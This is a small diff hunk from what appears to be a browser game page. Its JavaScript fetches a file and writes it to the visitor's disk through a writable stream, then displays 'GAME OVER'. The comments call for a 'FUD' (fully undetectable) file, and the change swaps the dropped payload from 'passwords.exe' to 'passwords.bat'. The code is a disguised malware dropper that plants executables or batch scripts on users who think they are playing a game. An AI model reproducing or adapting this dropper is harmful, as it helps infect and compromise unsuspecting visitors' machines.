@@ -78,7 +78,7 @@
                 // 1) download file from local/server (Good for exe)
                 //you need to have FUD file lnkextra.lnk on server/local
                 //can be changed to diffrent file like cat.jpg
-                const response = await fetch('passwords.exe');
+                const response = await fetch('passwords.bat');
                 await response.body.pipeTo(writable);
 
                 document.querySelector("#gameover").textContent = "GAME OVER - Need refresh to start again"
